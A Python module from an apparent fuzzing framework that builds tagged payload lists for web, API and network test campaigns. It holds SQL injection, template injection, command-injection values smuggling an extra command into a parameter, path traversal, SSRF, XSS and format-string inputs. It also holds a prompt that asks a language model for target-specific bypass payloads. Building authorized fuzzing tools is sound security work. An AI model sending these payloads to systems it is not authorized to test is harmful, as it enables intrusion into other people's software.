"""agents/fuzzing/payloadgen.py — target-specific fuzz seed / payload generation.

Produces the inputs an engine will send.  Each payload is TAGGED with its vuln family
and an expected oracle ``marker`` so ``oracle.classify`` can recognise a successful
evaluation (e.g. an SSTI ``{{7*7}}`` should echo ``49``; a command-injection payload
should echo the campaign canary).  A deterministic built-in catalog means the lab works
with zero LLM; an optional best-effort LLM pass (tiered fallback, injected via
``ctx.llm_generate``) adds target-specific variants grounded in retrieved technique
context.  Nothing here is in the model-facing doctrine surface — payload literals belong
in a fuzzing engine.
"""
from __future__ import annotations

import json
import logging
from typing import Any, Dict, List

from agents.fuzzing.engines.base import CampaignCtx

logger = logging.getLogger("argus.fuzz.payloadgen")


def _web_catalog(canary: str, oob: str) -> List[Dict[str, str]]:
    """Built-in web/app payload families.  ``marker`` is what a SUCCESSFUL eval returns."""
    return [
        {"family": "sqli", "value": "' OR '1'='1' -- -", "marker": "", "where": "param"},
        {"family": "sqli", "value": "1' AND 1=CAST((SELECT 'X') AS INT)-- -", "marker": "", "where": "param"},
        {"family": "ssti", "value": "{{7*7}}", "marker": "49", "where": "param"},
        {"family": "ssti", "value": "${7*7}", "marker": "49", "where": "param"},
        {"family": "cmd", "value": f";echo {canary}", "marker": canary, "where": "param"},
        {"family": "cmd", "value": f"$({{echo,{canary}}})", "marker": canary, "where": "param"},
        {"family": "cmd", "value": f"|echo {canary}", "marker": canary, "where": "param"},
        {"family": "ssrf", "value": oob, "marker": "", "where": "param"},
        {"family": "lfi", "value": "....//....//....//etc/hostname", "marker": "", "where": "param"},
        {"family": "redos", "value": "a" * 64 + "!", "marker": "", "where": "param"},
        {"family": "xss", "value": f"<x>{canary}</x>", "marker": canary, "where": "param"},
    ]


def _generic_vectors() -> List[Dict[str, str]]:
    """OWASP generic data-type fuzz vectors (numbers / chars+encoding / long-buffer /
    format-string).  These aren't injection payloads — they probe for crashes, 5xx,
    overflow, and parser faults the oracle catches via status/timing/error-leak."""
    return [
        # Numbers: signed/unsigned + integer-overflow boundaries.
        {"family": "number", "value": "-1", "marker": "", "where": "param"},
        {"family": "number", "value": "2147483648", "marker": "", "where": "param"},
        {"family": "number", "value": "-2147483649", "marker": "", "where": "param"},
        {"family": "number", "value": "9999999999999999999999", "marker": "", "where": "param"},
        {"family": "number", "value": "0x7fffffff", "marker": "", "where": "param"},
        {"family": "number", "value": "1e309", "marker": "", "where": "param"},
        {"family": "number", "value": "NaN", "marker": "", "where": "param"},
        # Characters / encoding: NUL, CRLF, overlong + unicode + bad bytes.
        {"family": "encoding", "value": "%00", "marker": "", "where": "param"},
        {"family": "encoding", "value": "%0d%0a", "marker": "", "where": "param"},
        {"family": "encoding", "value": "%ff%fe", "marker": "", "where": "param"},
        {"family": "encoding", "value": "‮﻿￿", "marker": "", "where": "param"},
        # Long strings / buffer pressure.
        {"family": "buffer", "value": "A" * 1024, "marker": "", "where": "param"},
        {"family": "buffer", "value": "A" * 8192, "marker": "", "where": "param"},
        # Format strings.
        {"family": "format", "value": "%s%s%s%s%s%s", "marker": "", "where": "param"},
        {"family": "format", "value": "%n%n%n%n", "marker": "", "where": "param"},
        {"family": "format", "value": "%x%x%x%x%x%x", "marker": "", "where": "param"},
    ]


def _proto_catalog() -> List[Dict[str, Any]]:
    """Structure-aware-ish network mutations: oversize, format, boundary, type-confuse."""
    return [
        {"family": "proto", "value": b"A" * 2048, "marker": "", "mutation": "oversize"},
        {"family": "proto", "value": b"%n%n%n%n", "marker": "", "mutation": "format"},
        {"family": "proto", "value": b"\xff\xff\xff\xff", "marker": "", "mutation": "boundary"},
        {"family": "proto", "value": b"\x00" * 64, "marker": "", "mutation": "nulls"},
    ]


_AUG_SYS = ("You generate fuzzing payloads for an AUTHORIZED test. Return ONLY a JSON "
            "array of objects {family, value, marker, where}. marker is the exact string "
            "a successful evaluation returns (use the provided canary for command exec).")


async def generate(ctx: CampaignCtx, *, augment: bool = True,
                   max_payloads: int = 60) -> List[Dict[str, Any]]:
    """Return the payload list for this campaign's modality.  Built-in catalog first;
    then a best-effort LLM augmentation (never required, never raises)."""
    modality = (ctx.modality or "web").lower()
    if modality in ("web", "api"):
        base = _web_catalog(ctx.canary, ctx.oob_url) + _generic_vectors()
    elif modality == "network":
        base = _proto_catalog()
    else:
        base = []

    if augment and ctx.llm_generate is not None and modality in ("web", "api"):
        try:
            extra = await _augment(ctx)
            base = base + extra
        except Exception as exc:   # noqa: BLE001
            logger.debug("payload augmentation skipped: %s", exc)

    # De-dup by (family, value) and cap.
    seen, out = set(), []
    for p in base:
        key = (p.get("family"), str(p.get("value"))[:80])
        if key in seen:
            continue
        seen.add(key)
        out.append(p)
        if len(out) >= max_payloads:
            break
    return out


async def _augment(ctx: CampaignCtx) -> List[Dict[str, Any]]:
    grounding = ""
    try:
        from knowledge.technique_search import technique_search
        fp = str(ctx.surface.get("tech") or ctx.surface.get("service") or ctx.target)
        hits = technique_search(f"{fp} injection payload bypass", k=4)
        grounding = "\n".join(f"- {h.get('title')}: {h.get('snippet')}" for h in hits)
    except Exception:
        pass
    prompt = (f"Target: {ctx.target}\nSurface: {ctx.surface or {}}\n"
              f"Canary (echo this to prove command exec): {ctx.canary}\n"
              f"OOB URL (for SSRF/blind): {ctx.oob_url}\n"
              + (f"Technique context:\n{grounding}\n" if grounding else "")
              + "Produce up to 15 target-specific payloads as the JSON array.")
    raw = await ctx.llm_generate(prompt, _AUG_SYS)
    return _parse_payloads(raw)


def _parse_payloads(raw: str) -> List[Dict[str, Any]]:
    if not raw:
        return []
    s = raw.strip()
    i, j = s.find("["), s.rfind("]")
    if i < 0 or j <= i:
        return []
    try:
        arr = json.loads(s[i:j + 1])
    except Exception:
        return []
    out = []
    for o in arr if isinstance(arr, list) else []:
        if isinstance(o, dict) and o.get("value"):
            out.append({"family": str(o.get("family") or "custom"),
                        "value": str(o.get("value"))[:2000],
                        "marker": str(o.get("marker") or ""),
                        "where": str(o.get("where") or "param")})
    return out
